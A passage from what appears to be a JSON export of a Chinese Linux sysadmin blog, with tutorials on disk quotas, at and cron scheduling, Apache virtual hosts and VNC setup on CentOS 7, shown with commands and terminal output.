my1.iso，并且删除一个文件，因为限制了文件数为5 写入失败，因为总共已经超过20m 了 [zhangsan@localhost xfs]$ ls a1 a2 a3 a4 my.iso [zhangsan@localhost xfs]$ rm -rf a4 [zhangsan@localhost xfs]$ ls a1 a2 a3 my.iso [zhangsan@localhost xfs]$ dd if=/dev/zero of=my1.iso bs=1M count=12 dd: error writing ‘my1.iso’: Disk quota exceeded 9+0 records in 8+0 records out 8388608 bytes (8.4 MB) copied, 0.00518743 s, 1.6 GB/s查看 [root@localhost ~]# xfs_quota -x -c report /mnt/xfs/ User quota on /mnt/xfs (/dev/mapper/myvg-xfs) Blocks User ID Used Soft Hard Warn/Grace ---------- -------------------------------------------------- root 0 0 0 00 [--------] zhangsan 20480 12288 20480 00 [6 days] Group quota on /mnt/xfs (/dev/mapper/myvg-xfs) Blocks Group ID Used Soft Hard Warn/Grace ---------- -------------------------------------------------- root 0 0 0 00 [--------] zhangsan 20480 0 0 00 [--------]也可以使用edquota 去设置 [root@localhost ~]# edquota -u zhangsan Disk quotas for user zhangsan (uid 1010): Filesystem blocks soft hard inodes soft hard /dev/mapper/myvg-xfs 20480 12288 20480 5 3 5默认情况下是限制用户，限制组，可以参考如下命令 [root@localhost ~]# xfs_quota -x -c &apos;limit bsoft=10m bhard=30m isoft=10 ihard=30 -g zhangsan&apos; /mnt/xfs/然后 [root@localhost ~]# edquota -g zhangsan Disk quotas for group zhangsan (gid 1012): Filesystem blocks soft hard inodes soft hard /dev/mapper/myvg-xfs 20480 10240 30720 5 10 30","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"使用Linux的磁盘配额","slug":"使用Linux的磁盘配额","date":"2017-06-14T07:38:22.000Z","updated":"2021-02-26T06:05:29.307Z","comments":true,"path":"posts/3685061821.html","link":"","permalink":"https://awen.me/posts/3685061821.html","excerpt":"启动文件系统对配额的支持格式化磁盘sdc7 为 ext4 [root@localhost data]# blkid /dev/sdc7 /dev/sdc7: UUID=&quot;0dc3603b-bb2b-4ecc-b7bb-f2ea8078ce9d&quot; TYPE=&quot;xfs&quot; [root@localhost data]# cat /etc/fstab # # /etc/fstab # Created by anaconda on Mon Apr 17 21:42:08 2017 # # Accessible filesystems, by reference, are maintained under &apos;/dev/disk&apos; # See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info # /dev/mapper/cl-root / xfs defaults 0 0 UUID=4e9e73e3-0ff0-4ac5-865f-7ab4975be268 /boot xfs defaults 0 0 /dev/mapper/cl-swap swap swap defaults 0 0 UUID=0dc3603b-bb2b-4ecc-b7bb-f2ea8078ce9d /mnt/data ext4 defualts,usrquota,grpquota 0 0","text":"启动文件系统对配额的支持格式化磁盘sdc7 为 ext4 [root@localhost data]# blkid /dev/sdc7 /dev/sdc7: UUID=&quot;0dc3603b-bb2b-4ecc-b7bb-f2ea8078ce9d&quot; TYPE=&quot;xfs&quot; [root@localhost data]# cat /etc/fstab # # /etc/fstab # Created by anaconda on Mon Apr 17 21:42:08 2017 # # Accessible filesystems, by reference, are maintained under &apos;/dev/disk&apos; # See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info # /dev/mapper/cl-root / xfs defaults 0 0 UUID=4e9e73e3-0ff0-4ac5-865f-7ab4975be268 /boot xfs defaults 0 0 /dev/mapper/cl-swap swap swap defaults 0 0 UUID=0dc3603b-bb2b-4ecc-b7bb-f2ea8078ce9d /mnt/data ext4 defualts,usrquota,grpquota 0 0 执行 mount -a然后 mount 查看最后一行，如果有如下内容则表示成功。 [root@localhost mnt]# mount | tail -1 /dev/sdc7 on /mnt/data type ext4 (rw,relatime,seclabel,quota,usrquota,grpquota,data=ordered)检测磁盘配额并创建配额文件[root@localhost mnt]# quotacheck --help Utility for checking and repairing quota files. quotacheck [-gucbfinvdmMR] [-F &lt;quota-format&gt;] filesystem|-a -u, --user check user files -g, --group check group files -c, --create-files create new quota files -b, --backup create backups of old quota files -f, --force force check even if quotas are enabled -i, --interactive interactive mode -n, --use-first-dquot use the first copy of duplicated structure -v, --verbose print more information -d, --debug print even more messages -m, --no-remount do not remount filesystem read-only -M, --try-remount try remounting filesystem read-only, continue even if it fails -R, --exclude-root exclude root when checking all filesystems -F, --format=formatname check quota files of specific format -a, --all check all filesystems -h, --help display this message and exit -V, --version display version information and exit Bugs to jack@suse.cz使用quotacheck -ugcv 需要操作的设备 来创建配额文件 [root@localhost mnt]# quotacheck -ugcv /dev/sdc7 quotacheck: Your kernel probably supports journaled quota but you are not using it. Consider switching to journaled quota to avoid running quotacheck after an unclean shutdown. quotacheck: Scanning /dev/sdc7 [/mnt/data] done quotacheck: Checked 2 directories and 2 files [root@localhost mnt]# ls /mnt/data aquota.group aquota.user lost+found [root@localhost mnt]# 如果挂载的目录有aquota.group和aquota.user 则表示成功。 创建用户[root@localhost mnt]# useradd zhangsan [root@localhost mnt]# passwd zhangsan Changing password for user zhangsan. New password: BAD PASSWORD: The password is shorter than 8 characters Retype new password: passwd: all authentication tokens updated successfully.创建用户配额[root@localhost mnt]# edquota -u zhangsan Disk quotas for user zhangsan (uid 1010): Filesystem blocks soft hard inodes soft hard /dev/sdc7 0 0 0 0 0 0 前三列 blocks 针对块 后三列 inodes 针对文件数 soft 是软现在 hard 是硬限制 注： 不该随便改 blocks 和 inodes 的数字，它是系统自带检测识别的 启用和关闭配额功能 [root@localhost mnt]# quotaon /dev/sdc7 #开启 [root@localhost mnt]# quotaon /dev/sdc7 # 关闭 测试 我设置的软现在为5 硬限制为6 [root@localhost mnt]# setfacl -m user:zhangsan:rwx data [root@localhost mnt]# su zhangsan [zhangsan@localhost mnt]$ clear [zhangsan@localhost mnt]$ ls data data1 [zhangsan@localhost mnt]$ cd data [zhangsan@localhost data]$ ll total 32 -rw-------. 1 root root 6144 Apr 22 15:50 aquota.group -rw-------. 1 root root 7168 Apr 22 15:50 aquota.user drwx------. 2 root root 16384 Apr 22 15:27 lost+found [zhangsan@localhost data]$ touch a{1..10} sdc7: warning, user file quota exceeded. #软限制生效 sdc7: write failed, user file limit reached.#硬限制生效 touch: cannot touch ‘a7’: Disk quota exceeded touch: cannot touch ‘a8’: Disk quota exceeded touch: cannot touch ‘a9’: Disk quota exceeded touch: cannot touch ‘a10’: Disk quota exceeded [zhangsan@localhost data]$ ll total 32 -rw-rw-r--. 1 zhangsan zhangsan 0 Apr 22 15:53 a1 -rw-rw-r--. 1 zhangsan zhangsan 0 Apr 22 15:53 a2 -rw-rw-r--. 1 zhangsan zhangsan 0 Apr 22 15:53 a3 -rw-rw-r--. 1 zhangsan zhangsan 0 Apr 22 15:53 a4 -rw-rw-r--. 1 zhangsan zhangsan 0 Apr 22 15:53 a5 -rw-rw-r--. 1 zhangsan zhangsan 0 Apr 22 15:53 a6 -rw-------. 1 root root 7168 Apr 22 15:50 aquota.group -rw-------. 1 root root 7168 Apr 22 15:50 aquota.user drwx------. 2 root root 16384 Apr 22 15:27 lost+found再次检查配置文件，发送 inodes 变成了6 限制大小 设置块大小，单位是千字节(kb) 写入120M文件 [zhangsan@localhost data]$ dd if=/dev/zero of=my.iso bs=1M count=120 120+0 records in 120+0 records out 125829120 bytes (126 MB) copied, 0.139963 s, 899 MB/s没有报错，然后在写入150m 文件，提示错误了。 [zhangsan@localhost data]$ dd if=/dev/zero of=my.iso bs=1M count=150 sdc7: write failed, user block limit reached. dd: error writing ‘my.iso’: Disk quota exceeded 121+0 records in 120+0 records out 125829120 bytes (126 MB) copied, 0.119931 s, 1.0 GB/s对组进行限制1.设置组配额的配置文件 [root@localhost ~]# edquota -g zhangsan 创建用户并把 lisi 这个用户的组设置为 zhangsan [root@localhost ~]# useradd lisi -g zhangsan [root@localhost ~]# passwd lisi Changing password for user lisi. New password: Retype new password: passwd: all authentication tokens updated successfully.赋予权限，让lisi对 data 目录具有读写执行的权限 [root@localhost mnt]# setfacl -m user:lisi:rwx data然后切换到lisi 写入文件，报错了。 [lisi@localhost data]$ dd if=/dev/zero of=my1.iso bs=1M count=120 sdc7: write failed, group block limit reached. dd: error writing ‘my1.iso’: Disk quota exceeded 1+0 records in 0+0 records out 0 bytes (0 B) copied, 0.000769198 s, 0.0 kB/s","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"Centos7 计划任务","slug":"Centos7-计划任务","date":"2017-06-14T07:37:04.000Z","updated":"2021-02-26T06:05:29.243Z","comments":true,"path":"posts/942820812.html","link":"","permalink":"https://awen.me/posts/942820812.html","excerpt":"at一次性计划任务 1.创建一次性计划任务 [fwj@rhca ~]$ at 14:18 at&gt; ping www.baidu.com &gt;&gt; /opt/baidu at&gt; ^C[fwj@rhca ~]$ at 14:18 at&gt; ping www.baidu.com &gt;&gt; /opt/baidu&lt;EOT&gt; job 3 at Sun Apr 23 14:18:00 2017","text":"at一次性计划任务 1.创建一次性计划任务 [fwj@rhca ~]$ at 14:18 at&gt; ping www.baidu.com &gt;&gt; /opt/baidu at&gt; ^C[fwj@rhca ~]$ at 14:18 at&gt; ping www.baidu.com &gt;&gt; /opt/baidu&lt;EOT&gt; job 3 at Sun Apr 23 14:18:00 2017 输入 ctrl+d 保存退出 2.查看 [fwj@rhca ~]$ atq 3 Sun Apr 23 14:18:00 2017 a fwj [fwj@rhca ~]$3.删除 [root@rhca ~]# atrm 4 [root@rhca ~]# atqcrontab1.查看服务状态 [root@rhca ~]# systemctl status crond.service ● crond.service - Command Scheduler Loaded: loaded (/usr/lib/systemd/system/crond.service; enabled; vendor preset: enabled) Active: active (running) since Sun 2017-04-23 14:16:31 CST; 4min 28s ago Main PID: 1173 (crond) CGroup: /system.slice/crond.service └─1173 /usr/sbin/crond -n Apr 23 14:16:31 rhca systemd[1]: Started Command Scheduler. Apr 23 14:16:31 rhca systemd[1]: Starting Command Scheduler... Apr 23 14:16:31 rhca crond[1173]: (CRON) INFO (RANDOM_DELAY will be scaled with factor 28% if used.) Apr 23 14:16:34 rhca crond[1173]: (CRON) INFO (running with inotify support)###主要配置文件 全局配置文件:/etc/crontab 系统默认的设置: /etc/cron.*/ 用户定义的设置: /var/spool/cron/user 格式# For details see man 4 crontabs # Example of job definition: # .---------------- minute (0 - 59) # | .------------- hour (0 - 23) # | | .---------- day of month (1 - 31) # | | | .------- month (1 - 12) OR jan,feb,mar,apr ... # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat # | | | | | # * * * * * user-name command to be executed计划任务格式 * * * * * user-name command to be executed 前面5列分别代表： 第一列表示分 0-59 第二列表示时 0-23 第三列表示天 1-31 第四列表示月 1-12 第七列（可选）表示用户 第八列 表示需要执行的具体脚本或命令的绝对路径 通配符 *表示任意时间 ,表示多个不连续的时间点 -表示一个连续的时间范围 /表示间隔的时间频率 查看列表 [root@rhca ~]# crontab -l */1 * * * * root /usr/bin/ping awen.com &gt;&gt; /opt/www [root@rhca ~]# tail -f /var/log/cron cron cron-20170423查看日志 [root@rhca ~]# tail -f /var/log/cron Apr 23 14:44:26 rhca crontab[12788]: (root) BEGIN EDIT (root) Apr 23 14:44:36 rhca crontab[12788]: (root) REPLACE (root) Apr 23 14:44:36 rhca crontab[12788]: (root) END EDIT (root) Apr 23 14:44:41 rhca crontab[12792]: (root) LIST (root) Apr 23 14:44:44 rhca crontab[12794]: (root) BEGIN EDIT (root) Apr 23 14:44:55 rhca crontab[12794]: (root) REPLACE (root) Apr 23 14:44:55 rhca crontab[12794]: (root) END EDIT (root) Apr 23 14:45:00 rhca crontab[12798]: (root) LIST (root) Apr 23 14:45:01 rhca crond[1173]: (root) RELOAD (/var/spool/cron/root) Apr 23 14:45:01 rhca CROND[12804]: (root) CMD (root /usr/bin/ping awen.com &gt;&gt; /opt/www)案例编辑计划任务 crontab -e附：crontab规则详细实例 1.每天6：00执行 0 6 * * * root/root/root.sh2.每周六凌晨4:00执行 0 4 * * 6 root /root/root.sh3.每周六凌晨4:05执行 5 4 * * 6 root /root/root.sh4.每周六凌晨4:15执行 15 4 * * 6 root /root/root.sh5.每周六凌晨4:25执行 25 4 * * 6 root /root/root.sh6.每周一到周五的11:41开始，每10分钟执行一次 1-59/10 12-23 * * 1-5 root /root/root.sh7.每天的10:31开始，每隔2小时执行一次 31 10-23/2 * * * root /root/root.sh","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"Apache 服务","slug":"Apache-服务","date":"2017-06-14T07:33:22.000Z","updated":"2021-02-26T06:05:29.239Z","comments":true,"path":"posts/1424908464.html","link":"","permalink":"https://awen.me/posts/1424908464.html","excerpt":"http 协议http 协议 （超文本传输协议）略…… 安装[root@server ~]# yum -y install httpd Loaded plugins: fastestmirror, langpacks Loading mirror speeds from cached hostfile Package httpd-2.4.6-45.el7.centos.x86_64 already installed and latest version Nothing to do [root@server ~]# systemctl enable httpd Created symlink from /etc/systemd/system/multi-user.target.wants/httpd.service to /usr/lib/systemd/system/httpd.service. [root@server ~]# systemctl start httpd","text":"http 协议http 协议 （超文本传输协议）略…… 安装[root@server ~]# yum -y install httpd Loaded plugins: fastestmirror, langpacks Loading mirror speeds from cached hostfile Package httpd-2.4.6-45.el7.centos.x86_64 already installed and latest version Nothing to do [root@server ~]# systemctl enable httpd Created symlink from /etc/systemd/system/multi-user.target.wants/httpd.service to /usr/lib/systemd/system/httpd.service. [root@server ~]# systemctl start httpd 浏览器访问 命令行访问 [root@desktop smb1]# curl -I http://172.10.100.128 -v * About to connect() to 172.10.100.128 port 80 (#0) * Trying 172.10.100.128... * Connected to 172.10.100.128 (172.10.100.128) port 80 (#0) &gt; HEAD / HTTP/1.1 &gt; User-Agent: curl/7.29.0 &gt; Host: 172.10.100.128 &gt; Accept: */* &gt; &lt; HTTP/1.1 403 Forbidden HTTP/1.1 403 Forbidden &lt; Date: Sun, 07 May 2017 06:10:27 GMT Date: Sun, 07 May 2017 06:10:27 GMT &lt; Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.1e-fips mod_fcgid/2.3.9 Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.1e-fips mod_fcgid/2.3.9 &lt; Last-Modified: Thu, 16 Oct 2014 13:20:58 GMT Last-Modified: Thu, 16 Oct 2014 13:20:58 GMT &lt; ETag: &quot;1321-5058a1e728280&quot; ETag: &quot;1321-5058a1e728280&quot; &lt; Accept-Ranges: bytes Accept-Ranges: bytes &lt; Content-Length: 4897 Content-Length: 4897 &lt; Content-Type: text/html; charset=UTF-8 Content-Type: text/html; charset=UTF-8 &lt; * Connection #0 to host 172.10.100.128 left intact工作目录 /etc/httpd/ 配置文件，主程序目录 /var/www/html/ web 主目录 httpd 脚本程序 /var/log 在主目录添加一个文件内容为 hello world [root@server html]# ls index.html [root@server html]# cat index.html hello world [root@server html]# pwd /var/www/html [root@server html]#内容 &lt;html&gt; &lt;head&gt; &lt;title&gt;This is test page&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;hello world! &lt;/h1&gt; &lt;/body&gt; &lt;/html&gt;主配置文件[root@server html]# cat /etc/httpd/conf/httpd.conf ServerRoot &quot;/etc/httpd&quot; Listen 80 #监听端口 Include conf.modules.d/*.conf #导入外部的模块配置文件 User apache #运行用户 Group apache #运行组 ServerAdmin root@localhost #管理员邮箱 ServerName www.example.com:80 #域名 &lt;Directory /&gt; AllowOverride none Require all denied &lt;/Directory&gt; DocumentRoot &quot;/var/www/html&quot; #web 文件主目录 &lt;Directory &quot;/var/www&quot;&gt; AllowOverride None # Allow open access: Require all granted &lt;/Directory&gt; &lt;Directory &quot;/var/www/html&quot;&gt; # # Possible values for the Options directive are &quot;None&quot;, &quot;All&quot;, # or any combination of: # Indexes Includes FollowSymLinks SymLinksifOwnerMatch ExecCGI MultiViews # # Note that &quot;MultiViews&quot; must be named *explicitly* --- &quot;Options All&quot; # doesn&apos;t give it to you. # # The Options directive is both complicated and important. Please see # http://httpd.apache.org/docs/2.4/mod/core.html#options # for more information. # Options Indexes FollowSymLinks # # AllowOverride controls what directives may be placed in .htaccess files. # It can be &quot;All&quot;, &quot;None&quot;, or any combination of the keywords: # Options FileInfo AuthConfig Limit # AllowOverride None # # Controls who can get stuff from this server. # Require all granted &lt;/Directory&gt; &lt;IfModule dir_module&gt; DirectoryIndex index.html &lt;/IfModule&gt; &lt;Files &quot;.ht*&quot;&gt; Require all denied &lt;/Files&gt; ErrorLog &quot;logs/error_log&quot; LogLevel warn &lt;IfModule log_config_module&gt; # # The following directives define some format nicknames for use with # a CustomLog directive (see below). # LogFormat &quot;%h %l %u %t \\&quot;%r\\&quot; %&gt;s %b \\&quot;%{Referer}i\\&quot; \\&quot;%{User-Agent}i\\&quot;&quot; combined LogFormat &quot;%h %l %u %t \\&quot;%r\\&quot; %&gt;s %b&quot; common &lt;IfModule logio_module&gt; # You need to enable mod_logio.c to use %I and %O LogFormat &quot;%h %l %u %t \\&quot;%r\\&quot; %&gt;s %b \\&quot;%{Referer}i\\&quot; \\&quot;%{User-Agent}i\\&quot; %I %O&quot; combinedio &lt;/IfModule&gt; # # The location and format of the access logfile (Common Logfile Format). # If you do not define any access logfiles within a &lt;VirtualHost&gt; # container, they will be logged here. Contrariwise, if you *do* # define per-&lt;VirtualHost&gt; access logfiles, transactions will be # logged therein and *not* in this file. # #CustomLog &quot;logs/access_log&quot; common # # If you prefer a logfile with access, agent, and referer information # (Combined Logfile Format) you can use the following directive. # CustomLog &quot;logs/access_log&quot; combined &lt;/IfModule&gt; &lt;IfModule alias_module&gt; # # Redirect: Allows you to tell clients about documents that used to # exist in your server&apos;s namespace, but do not anymore. The client # will make a new request for the document at its new location. # Example: # Redirect permanent /foo http://www.example.com/bar # # Alias: Maps web paths into filesystem paths and is used to # access content that does not live under the DocumentRoot. # Example: # Alias /webpath /full/filesystem/path # # If you include a trailing / on /webpath then the server will # require it to be present in the URL. You will also likely # need to provide a &lt;Directory&gt; section to allow access to # the filesystem path. # # ScriptAlias: This controls which directories contain server scripts. # ScriptAliases are essentially the same as Aliases, except that # documents in the target directory are treated as applications and # run by the server when requested rather than as documents sent to the # client. The same rules about trailing &quot;/&quot; apply to ScriptAlias # directives as to Alias. # ScriptAlias /cgi-bin/ &quot;/var/www/cgi-bin/&quot; &lt;/IfModule&gt; &lt;Directory &quot;/var/www/cgi-bin&quot;&gt; AllowOverride None Options None Require all granted &lt;/Directory&gt; &lt;IfModule mime_module&gt; # # TypesConfig points to the file containing the list of mappings from # filename extension to MIME-type. # TypesConfig /etc/mime.types # # AddType allows you to add to or override the MIME configuration # file specified in TypesConfig for specific file types. # #AddType application/x-gzip .tgz # # AddEncoding allows you to have certain browsers uncompress # information on the fly. Note: Not all browsers support this. # #AddEncoding x-compress .Z #AddEncoding x-gzip .gz .tgz # # If the AddEncoding directives above are commented-out, then you # probably should define those extensions to indicate media types: # AddType application/x-compress .Z AddType application/x-gzip .gz .tgz # # AddHandler allows you to map certain file extensions to &quot;handlers&quot;: # actions unrelated to filetype. These can be either built into the server # or added with the Action directive (see below) # # To use CGI scripts outside of ScriptAliased directories: # (You will also need to add &quot;ExecCGI&quot; to the &quot;Options&quot; directive.) # #AddHandler cgi-script .cgi # For type maps (negotiated resources): #AddHandler type-map var # # Filters allow you to process content before it is sent to the client. # # To parse .shtml files for server-side includes (SSI): # (You will also need to add &quot;Includes&quot; to the &quot;Options&quot; directive.) # AddType text/html .shtml AddOutputFilter INCLUDES .shtml &lt;/IfModule&gt; AddDefaultCharset UTF-8 #默认编码格式是 UFT-8 &lt;IfModule mime_magic_module&gt; # # The mod_mime_magic module allows the server to use various hints from the # contents of the file itself to determine its type. The MIMEMagicFile # directive tells the module where the hint definitions are located. # MIMEMagicFile conf/magic &lt;/IfModule&gt; EnableSendfile on IncludeOptional conf.d/*.conf #导入外部的配置文件日志[root@server html]# tail -f /var/log/httpd/access_log 172.10.100.1 - - [07/May/2017:02:18:21 -0400] &quot;GET /noindex/css/fonts/Light/OpenSans-Light.woff HTTP/1.1&quot; 404 241 &quot;http://172.10.100.128/noindex/css/open-sans.css&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36&quot; 172.10.100.1 - - [07/May/2017:02:18:21 -0400] &quot;GET /noindex/css/fonts/Bold/OpenSans-Bold.woff HTTP/1.1&quot; 404 239 &quot;http://172.10.100.128/noindex/css/open-sans.css&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36&quot; 172.10.100.1 - - [07/May/2017:02:18:21 -0400] &quot;GET /noindex/css/fonts/Light/OpenSans-Light.ttf HTTP/1.1&quot; 404 240 &quot;http://172.10.100.128/noindex/css/open-sans.css&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36&quot; 172.10.100.1 - - [07/May/2017:02:18:21 -0400] &quot;GET /noindex/css/fonts/Bold/OpenSans-Bold.ttf HTTP/1.1&quot; 404 238 &quot;http://172.10.100.128/noindex/css/open-sans.css&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36&quot; 172.10.100.1 - - [07/May/2017:02:18:21 -0400] &quot;GET /favicon.ico HTTP/1.1&quot; 404 209 &quot;http://172.10.100.128/&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36&quot; 172.10.100.1 - - [07/May/2017:02:19:12 -0400] &quot;-&quot; 408 - &quot;-&quot; &quot;-&quot; 172.10.100.1 - - [07/May/2017:02:19:12 -0400] &quot;-&quot; 408 - &quot;-&quot; &quot;-&quot; 172.10.100.1 - - [07/May/2017:02:19:12 -0400] &quot;-&quot; 408 - &quot;-&quot; &quot;-&quot; 172.10.100.1 - - [07/May/2017:02:22:08 -0400] &quot;GET / HTTP/1.1&quot; 200 12 &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36&quot; 172.10.100.1 - - [07/May/2017:02:22:08 -0400] &quot;GET /favicon.ico HTTP/1.1&quot; 404 209 &quot;http://172.10.100.128/&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36&quot;格式通常在配置文件中定义 LogFormat &quot;%h %l %u %t \\&quot;%r\\&quot; %&gt;s %b \\&quot;%{Referer}i\\&quot; \\&quot;%{User-Agent}i\\&quot;&quot; combined LogFormat &quot;%h %l %u %t \\&quot;%r\\&quot; %&gt;s %b&quot; common以这条日志分析 172.10.100.1 - - [07/May/2017:02:22:08 -0400] &quot;GET /favicon.ico HTTP/1.1&quot; 404 209 &quot;http://172.10.100.128/&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36&quot;从左到右分别是 [请求的 ip 地址] – [请求的时间] [http 的方法] [请求的 uri] [http 的协议] [请求的状态码] [请求的文件大小] [请求的url] [user-agent] 基于主机名的虚拟主机[root@server html]# cp /usr/share/doc/httpd-2.4.6/httpd-vhosts.conf /etc/httpd/conf.d/01-www.baidu.com.conf [root@server html]# cp /usr/share/doc/httpd-2.4.6/httpd-vhosts.conf /etc/httpd/conf.d/00-www.google.com.conf内容 &lt;VirtualHost *:@@Port@@&gt; ServerAdmin webmaster@dummy-host.example.com DocumentRoot &quot;@@ServerRoot@@/docs/dummy-host.example.com&quot; ServerName dummy-host.example.com ServerAlias www.dummy-host.example.com ErrorLog &quot;/var/log/httpd/dummy-host.example.com-error_log&quot; CustomLog &quot;/var/log/httpd/dummy-host.example.com-access_log&quot; common &lt;/VirtualHost&gt; &lt;VirtualHost *:@@Port@@&gt; ServerAdmin webmaster@dummy-host2.example.com DocumentRoot &quot;@@ServerRoot@@/docs/dummy-host2.example.com&quot; ServerName dummy-host2.example.com ErrorLog &quot;/var/log/httpd/dummy-host2.example.com-error_log&quot; CustomLog &quot;/var/log/httpd/dummy-host2.example.com-access_log&quot; common &lt;/VirtualHost&gt;2.创建主机目录 [root@server html]# mkdir -p /var/www/baidu [root@server html]# mkdir -p /var/www/google [root@server html]# echo baidu &gt;&gt; /var/www//baidu/index.html [root@server html]# echo google &gt;&gt; /var/www/google/index.html3.修改 Google 的配置文件 vim /etc/httpd/conf.d/00-www.google.com.conf修改内容如下 &lt;VirtualHost *:80&gt; #ServerAdmin webmaster@dummy-host.example.com DocumentRoot &quot;/var/www/google/&quot; ServerName www.google.com ServerAlias www.dummy-host.example.com ErrorLog &quot;/var/log/httpd/google.com-error_log&quot; CustomLog &quot;/var/log/httpd/google.com-access_log&quot; common &lt;Directory &quot;/var/www/google&quot;&gt; Require all granted &lt;/Directory&gt; &lt;/VirtualHost&gt;4.修改 baidu 的配置文件 vim /etc/httpd/conf.d/00-www.baidu.com.conf修改如下 &lt;VirtualHost *:80&gt; #ServerAdmin webmaster@dummy-host.example.com DocumentRoot &quot;/var/www/baidu/&quot; ServerName www.baidu.com #ServerAlias www.dummy-host.example.com ErrorLog &quot;/var/log/httpd/baidu.com-error_log&quot; CustomLog &quot;/var/log/httpd/baidu.com-access_log&quot; common &lt;Directory &quot;/var/www/baidu&quot;&gt; Require all granted &lt;/Directory&gt; &lt;/VirtualHost&gt;5.重启 httpd [root@server html]# systemctl restart httpd重启 httpd 6.客户端访问 [root@desktop httpd]# vim /etc/hosts [root@desktop httpd]# cat /etc/hosts 127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4 ::1 localhost localhost.localdomain localhost6 localhost6.localdomain6 172.10.100.128 www.baidu.com 172.10.100.128 www.google.comc7.访问 [root@desktop ~]# curl -X GET http://www.baidu.com baidu [root@desktop ~]# curl -X GET http://www.google.com google基于端口的虚拟主机其实基于端口就是在 /etc/httpd/conf/httpd.conf 增加一个监听端口 [root@server html]# cat /etc/httpd/conf/httpd.conf | grep ^Listen Listen 80 Listen 8080然后比如我要把 Google 的访问端口改为8080,就是将原来的端口80 修改为8080 [root@server html]# cat /etc/httpd/conf.d/00-www.google.com.conf | grep 8080 &lt;VirtualHost *:8080&gt;客户端访问 1.先测下端口通不通 [root@desktop ~]# telnet 172.10.100.128 8080 Trying 172.10.100.128... Connected to 172.10.100.128. Escape character is &apos;^]&apos;. ^C Connection closed by foreign host.2.然后访问 [root@desktop ~]# [root@desktop ~]# curl -X GET http://www.google.com:8080 -v * About to connect() to www.google.com port 8080 (#0) * Trying 172.10.100.128... * Connected to www.google.com (172.10.100.128) port 8080 (#0) &gt; GET / HTTP/1.1 &gt; User-Agent: curl/7.29.0 &gt; Host: www.google.com:8080 &gt; Accept: */* &gt; &lt; HTTP/1.1 200 OK &lt; Date: Sun, 07 May 2017 07:20:52 GMT &lt; Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.1e-fips mod_fcgid/2.3.9 &lt; Last-Modified: Sun, 07 May 2017 07:00:15 GMT &lt; ETag: &quot;7-54ee9acb5b2f4&quot; &lt; Accept-Ranges: bytes &lt; Content-Length: 7 &lt; Content-Type: text/html; charset=UTF-8 &lt; google * Connection #0 to host www.google.com left intact [root@desktop ~]#","categories":[],"tags":[{"name":"http","slug":"http","permalink":"https://awen.me/tags/http/"}]},{"title":"Centos 7 使用 vnc 远程管理图形化桌面","slug":"Centos-7-使用-vnc-远程管理图形化桌面","date":"2017-06-14T07:31:24.000Z","updated":"2021-02-26T06:05:29.241Z","comments":true,"path":"posts/2060134052.html","link":"","permalink":"https://awen.me/posts/2060134052.html","excerpt":"安装[root@localhost ~]# yum install tigervnc-server配置","text":"安装[root@localhost ~]# yum install tigervnc-server配置 1.拷贝模板 [root@localhost ~]# cp /lib/systemd/system/vncserver@.service /etc/systemd/system/vncserver@:1.service2.编辑 vi /etc/systemd/system/vncserver@:1.service3.找到如下位置的内容，把 USER 替换成你自己的用户 [Service] Type=forking # Clean any existing files in /tmp/.X11-unix environment ExecStartPre=/bin/sh -c &apos;/usr/bin/vncserver -kill %i &gt; /dev/null 2&gt;&amp;1 || :&apos; ExecStart=/usr/sbin/runuser -l &lt;USER&gt; -c &quot;/usr/bin/vncserver %i&quot; PIDFile=/home/&lt;USER&gt;/.vnc/%H%i.pid ExecStop=/bin/sh -c &apos;/usr/bin/vncserver -kill %i &gt; /dev/null 2&gt;&amp;1 || :&apos;例如 [Service] Type=forking # Clean any existing files in /tmp/.X11-unix environment ExecStartPre=/bin/sh -c &apos;/usr/bin/vncserver -kill %i &gt; /dev/null 2&gt;&amp;1 || :&apos; ExecStart=/usr/sbin/runuser -l fwj -c &quot;/usr/bin/vncserver %i&quot; PIDFile=/home/fwj/.vnc/%H%i.pid ExecStop=/bin/sh -c &apos;/usr/bin/vncserver -kill %i &gt; /dev/null 2&gt;&amp;1 || :&apos;然后设置防火墙 [root@localhost ~]# firewall-cmd --permanent --zone=public --add-service vnc-server success [root@localhost ~]# firewall-cmd --reload success然后切换到需要远程的用户下 [root@localhost ~]# su fwj [fwj@localhost root]$ vncserver You will require a password to access your desktops. Password: Verify: xauth: file /home/fwj/.Xauthority does not exist New &apos;localhost.localdomain:1 (fwj)&apos; desktop is localhost.localdomain:1 Creating default startup script /home/fwj/.vnc/xstartup Starting applications specified in /home/fwj/.vnc/xstartup Log file is 